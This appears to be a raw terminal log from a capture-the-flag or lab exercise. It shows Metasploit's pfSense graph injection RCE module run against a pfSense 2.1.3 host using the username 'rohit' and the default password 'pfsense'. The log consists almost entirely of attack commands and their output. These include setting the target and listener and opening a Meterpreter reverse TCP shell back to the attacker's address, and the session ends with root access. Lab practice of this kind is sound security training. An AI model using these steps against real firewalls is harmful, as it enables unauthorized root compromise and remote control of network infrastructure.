
hippoeug@kali:~$ msfconsole
msf6 > search pfsense

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     No     Clickjacking Vulnerability In CSRF Error Page pfSense
   1  exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  No     pfSense authenticated graph status RCE
   2  exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  Yes    pfSense authenticated group member RCE


Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/http/pfsense_group_member_exec

msf6 > use exploit/unix/http/pfsense_graph_injection_exec
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/http/pfsense_graph_injection_exec) > show options

Module options (exploit/unix/http/pfsense_graph_injection_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          yes       Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     443              yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   USERNAME  admin            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/http/pfsense_graph_injection_exec) > set rhost 10.129.85.110
rhost => 10.129.85.110
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set username rohit
username => rohit
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set lhost 10.10.14.6
lhost => 10.10.14.6
msf6 exploit(unix/http/pfsense_graph_injection_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[*] Sending stage (39282 bytes) to 10.129.85.110
[*] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.129.85.110:48852) at 2021-05-12 06:12:39 +0800
[+] Deleted fBpI

meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > getuid
Server username: root (0)
meterpreter > 











